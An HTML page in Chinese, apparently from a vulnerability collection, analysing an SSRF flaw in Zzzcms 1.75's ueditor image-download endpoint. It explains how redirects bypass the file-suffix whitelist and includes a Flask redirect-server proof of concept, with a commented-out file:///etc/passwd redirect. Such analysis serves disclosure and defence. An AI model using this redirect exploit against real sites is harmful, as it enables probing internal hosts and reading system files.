@@ -1,0 +1,34 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="zzzcms-175-ssrf"><span class="csDE05BCC">Zzzcms 1.75 ssrf</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">存在这个问题的接口主要功能是远程下载保存图片，但是后缀限制死了，因此远程下载</span><span class="cs8926E06">webshell</span><span class="cs9C1B1871">的目的应该是达不到了，退而求其次也可以作为</span><span class="cs8926E06">SSRF</span><span class="cs9C1B1871">利用，比如需要获取目标主机的真实</span><span class="cs8926E06">IP</span><span class="cs9C1B1871">地址的场景下。</span></p><h2 class="cs868C439D">
+			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs8926E06">Zzzcms 1.75</span></p><h2 class="cs868C439D">
+			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<h3 class="cs868C439D">
+			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">功能实现在</span></p><p class="cs3A447A38"><span class="cs9FB05234">plugins/ueditor/php/controller.php</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Zzzcms/Zzzcms%201.75%20ssrf_files/image0.png" width="560" height="535" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">传入的</span><span class="cs8926E06">post</span><span class="cs9C1B1871">参数进入</span><span class="cs8926E06">safe_url</span><span class="cs9C1B1871">函数进行处理，然后传入</span><span class="cs8926E06">down_url</span><span class="cs9C1B1871">函数。这里</span><span class="cs8926E06">safe_url</span><span class="cs9C1B1871">函数作用不大，主要是在</span><span class="cs8926E06">down_url</span><span class="cs9C1B1871">中的逻辑。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">down_url</span><span class="cs9C1B1871">函数逻辑中根据</span><span class="cs8926E06">url</span><span class="cs9C1B1871">获取了保存的文件名和后缀，并且进行了文件名后缀的白名单限制和检测。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Zzzcms/Zzzcms%201.75%20ssrf_files/image1.png" width="560" height="195" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">最后通过</span><span class="cs8926E06">readfile</span><span class="cs9C1B1871">进行远程资源获取（本地也可以，支持</span><span class="cs8926E06">file</span><span class="cs9C1B1871">协议），这里通过</span><span class="cs8926E06">file_ext</span><span class="cs9C1B1871">函数传入</span><span class="cs9FB05234">http://XXXX/x.php?x.jpg</span><span class="cs9C1B1871">得到的文件名后缀仍然是</span><span class="cs8926E06">php</span><span class="cs9C1B1871">，对问号进行了处理，因此利用</span><span class="cs8926E06">SSRF</span><span class="cs9C1B1871">达到任意地址访问需要利用</span><span class="cs8926E06">301/302</span><span class="cs9C1B1871">跳转实现，本地搭建一个提供跳转的</span><span class="cs8926E06">http</span><span class="cs9C1B1871">服务器，然后进行访问：</span></p><p class="cs3A447A38"><span class="cs9FB05234">from flask import Flask,redirect,request</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">app = Flask(__name__)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">@app.route(&#39;/1.txt&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">def index(page_name=&#39;&#39;):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;#return redirect(&#39;file:///etc/passwd&#39;, code=301) #not work</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return redirect(&#39;http://www.net.cn/static/customercare/yourip.asp&#39;, code=301)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if __name__ == &#39;__main__&#39;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;app.run(host=&#39;0.0.0.0&#39;, port=9000, debug=app.debug)</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Zzzcms/Zzzcms%201.75%20ssrf_files/image2.png" width="560" height="208" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Zzzcms/Zzzcms%201.75%20ssrf_files/image3.png" width="560" height="269" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
+			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
+		<p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/7414</span></p></body>
+</html>
